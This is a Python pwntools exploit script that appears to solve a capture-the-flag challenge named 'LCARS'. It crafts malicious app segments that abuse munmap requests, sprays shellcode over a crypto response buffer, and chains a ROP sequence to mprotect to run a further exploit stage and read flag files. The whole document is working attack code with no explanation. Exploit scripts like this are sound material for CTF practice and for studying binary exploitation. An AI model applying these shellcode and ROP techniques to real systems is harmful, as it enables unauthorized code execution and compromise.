from pwn import *
from Crypto.PublicKey import RSA
import hashlib, time
import app
# remove known root.key
app.KEYS[0] = 'Z' * 32
app.CERTS[0] = RSA.generate(2048)
context.arch = 'amd64'

# read flag rop
loader_base = 0x10000000
_mprotect = loader_base + 0xe0

# assume we already have code execution (or rop) as platform_app

r = process(['./LCARS', './init.sys', './loader.sys', './echo.sys',
    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp', 'flag22.txt',
    'flag333.txt'])

def download(app, blob):
    r.sendline('download %s %d' % (app, len(blob)))
    r.send(blob)

regions = 0x20000020
a = app.App('1')
# munmap local request
a.add_segment(0x20004000, 3, '\x00' * 0x10 + ''.join(map(p64, [
    0x30001000, 0x30002000, 0x1000,
    ])))
for i in xrange((0x20004010 - regions) / 0x18 - len(a.pages)):
    a.add_segment(0x500000 + i * 0x1000, 3, '\x00' * 0x10)
download('1', str(a))

a = app.App('2')
# munmap crypto response
crypto_result = 0x42000000 + 0x52000
a.add_segment(0x20004000, 3, '\x00' * 0x10 + ''.join(map(p64, [
    crypto_result, crypto_result + 0x1000, 0x1000,
    ])))
for i in xrange((0x20004010 - regions) / 0x18 - len(a.pages)):
    a.add_segment(0x500000 + i * 0x1000, 3, '\x00' * 0x10)
download('2', str(a))

a = app.App('3')
shellcode = asm('''
        add rsp, 0xd0;
        ret;
        pop rdi;
        pop rsi;
        pop rdx;
        pop rcx;
        ret;
''').ljust(0x10, '\xcc')
assert len(shellcode) == 0x10

sapp_base = 0x80000
ret = sapp_base + 7
pop_rdi_rsi_rdx_rcx = ret + 1

exp4_app = open('exp4.app').read()

flag_rop = ''.join(map(p64, [
    ret, ret, ret, ret, ret, ret,
    pop_rdi_rsi_rdx_rcx, 0x100000, 0x1000, 7, 0,
    _mprotect,
    0x100000,
    ]))

a.add_segment(0x30001000, 3, '\x00' * 0x1000)
a.add_segment(crypto_result, 3, shellcode * 0x100)
# spray by aes_decrypt
a.add_segment(0xd0000000, 3, '\x00' * 0xf10, key=1, cert=0xff)
a.add_segment(sapp_base, 5, '\x00' * 0x720, key=0)
a.add_segment(0xf0000000, 3, flag_rop)
a.add_segment(0x100000, 3, exp4_app)
a.add_segment(0x200000, 3, '\x00' * 0x10)
download('3', str(a))
r.sendline('run 1')
download('exp3.papp', open('exp3.papp').read())
r.sendline('run exp3.papp')

r.interactive()
